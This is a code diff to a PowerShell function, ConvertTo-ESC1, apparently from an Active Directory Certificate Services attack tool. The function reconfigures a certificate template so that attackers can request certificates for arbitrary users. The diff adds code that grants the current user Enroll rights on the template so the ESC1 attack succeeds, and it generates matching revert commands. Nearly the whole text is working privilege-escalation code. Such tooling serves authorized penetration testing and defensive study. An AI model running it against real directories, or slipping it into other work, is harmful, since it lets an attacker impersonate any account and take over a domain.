@@ -10,9 +10,13 @@ function ConvertTo-ESC1 {
         2. Enable the SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1) in msPKI-Certificate-Name-Flag
         3. Remove the Pend flag (CT_FLAG_PEND_ALL_REQUESTS = 0x2) from msPKI-Enrollment-Flag
         4. Set the msPKI-RA-Signature value to 0 (disable required signatures)
+        5. Grant the current user Enroll rights on the template
 
         These changes make the template vulnerable to ESC1 attacks where attackers can specify
         arbitrary Subject Alternative Names and obtain certificates for any user/computer.
+        
+        Additionally, the function grants the current user Enroll rights on the template to
+        ensure the attack can be executed successfully.
 
         .PARAMETER InputObject
         Either an ESCalatorIssue object representing an ESC4 vulnerability, or a DirectoryEntry object
@@ -259,6 +263,66 @@ function ConvertTo-ESC1 {
                 }
             } else {
                 Write-Verbose "msPKI-RA-Signature already set to 0"
+            }
+            
+            # 5. Grant current user Enroll rights on the template
+            try {
+                # Get current user's security identifier
+                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                $currentUserSid = $currentUser.User.Value
+                Write-Verbose "Current user SID: $currentUserSid"
+                
+                # Get the template's security descriptor
+                $templateSecurity = $template.ObjectSecurity
+                
+                # Define the Enroll right (0x0001) and AutoEnroll right (0x0002)
+                $enrollRight = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
+                $accessType = [System.Security.AccessControl.AccessControlType]::Allow
+                
+                # Create access rule for Enroll right
+                # The GUID for Certificate-Enrollment extended right is 0e10c968-78fb-11d2-90d4-00c04f79dc55
+                $enrollGuid = [System.Guid]::new("0e10c968-78fb-11d2-90d4-00c04f79dc55")
+                $enrollRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+                    $currentUser.User, $enrollRight, $accessType, $enrollGuid
+                )
+                
+                # Check if the user already has Enroll rights
+                $hasEnrollRights = $false
+                foreach ($rule in $templateSecurity.Access) {
+                    if ($rule.IdentityReference.Value -eq $currentUserSid -and 
+                        $rule.ActiveDirectoryRights -band $enrollRight -and
+                        $rule.ObjectType -eq $enrollGuid -and
+                        $rule.AccessControlType -eq $accessType) {
+                        $hasEnrollRights = $true
+                        break
+                    }
+                }
+                
+                if (-not $hasEnrollRights) {
+                    if ($PSCmdlet.ShouldProcess($template.Name, "Grant current user ($currentUserSid) Enroll rights")) {
+                        # Add the access rule
+                        $templateSecurity.AddAccessRule($enrollRule)
+                        $template.ObjectSecurity = $templateSecurity
+                        
+                        $changes += "Granted current user ($($currentUser.Name)) Enroll rights on template"
+                        Write-Verbose "Granted current user Enroll rights on template"
+                        
+                        # Generate revert command for Enroll rights
+                        $revertCommands += "# Remove Enroll rights for user $($currentUser.Name) ($currentUserSid)"
+                        $revertCommands += "`$userSid = [System.Security.Principal.SecurityIdentifier]::new('$currentUserSid')"
+                        $revertCommands += "`$enrollGuid = [System.Guid]::new('0e10c968-78fb-11d2-90d4-00c04f79dc55')"
+                        $revertCommands += "`$templateSecurity = `$template.ObjectSecurity"
+                        $revertCommands += "`$rulesToRemove = `$templateSecurity.Access | Where-Object { `$_.IdentityReference.Value -eq '$currentUserSid' -and `$_.ObjectType -eq `$enrollGuid }"
+                        $revertCommands += "foreach (`$rule in `$rulesToRemove) { `$templateSecurity.RemoveAccessRule(`$rule) }"
+                        $revertCommands += "`$template.ObjectSecurity = `$templateSecurity"
+                    }
+                } else {
+                    Write-Verbose "Current user already has Enroll rights on template"
+                }
+                
+            } catch {
+                Write-Warning "Failed to grant Enroll rights to current user: $($_.Exception.Message)"
+                # Don't fail the entire operation for this
             }
             
             # Commit changes to Active Directory
